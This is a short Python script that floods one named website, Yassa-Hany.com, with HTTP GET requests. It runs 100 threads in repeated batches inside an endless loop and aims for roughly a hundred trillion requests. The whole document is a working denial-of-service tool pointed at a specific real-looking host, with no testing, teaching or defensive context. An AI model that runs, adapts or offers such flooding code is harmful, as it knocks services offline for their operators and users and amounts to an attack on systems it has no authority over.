while True:
 import requests
 import concurrent.futures

 def send_request(url):
     response = requests.get(url)
     print(f"Request to {url} Status Code: {response.status_code}")
 urls = ["https://Yassa-Hany.com", "https://Yassa-Hany.com", "https://Yassa-Hany.com", "https://Yassa-Hany.com", "https://Yassa-Hany.com"]
 total_requests = 101273590619544
 requests_completed = 1000
 max_threads = 100
 while requests_completed < total_requests:
     with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
         urls_to_request = urls * max_threads
         requests_completed += len(urls_to_request)
         executor.map(send_request, urls_to_request)
